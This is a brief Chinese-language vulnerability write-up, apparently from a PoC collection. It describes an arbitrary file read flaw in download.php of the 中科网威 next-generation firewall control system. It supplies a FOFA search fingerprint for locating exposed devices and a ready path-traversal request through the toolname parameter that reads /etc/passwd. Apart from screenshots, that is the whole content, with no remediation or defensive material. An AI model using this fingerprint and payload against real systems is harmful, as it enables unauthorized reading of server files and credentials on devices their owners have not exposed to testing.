# 中科网威-下一代防火墙控制系统-download.php-任意文件读取漏洞

## 漏洞描述

中科网威-下一代防火墙控制系统-download.php-任意文件读取漏洞, 攻击者通过漏洞可以读取服务器上的文件

## 漏洞影响

> [!NOTE]
>
> 中科网威 下一代防火墙控制系统

## FOFA

> [!NOTE]
>
> body="Get_Verify_Info(hex_md5(user_string)."

## 漏洞复现

登录页面如下

![image-20210531184103009](中科网威-下一代防火墙控制系统-download.php-任意文件读取漏洞.assets/16273636295532339.jpg)

漏洞存在于 download.php

![image-20210602161941678](中科网威-下一代防火墙控制系统-download.php-任意文件读取漏洞.assets/1627363629839135.jpg)

任意点击后抓包，更改 **toolname** 参数

```
/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd
```

![image-20210602162110747](中科网威-下一代防火墙控制系统-download.php-任意文件读取漏洞.assets/162736363014247.jpg)

## Goby & POC

![image-20210602162300324](中科网威-下一代防火墙控制系统-download.php-任意文件读取漏洞.assets/16273636304801128.jpg)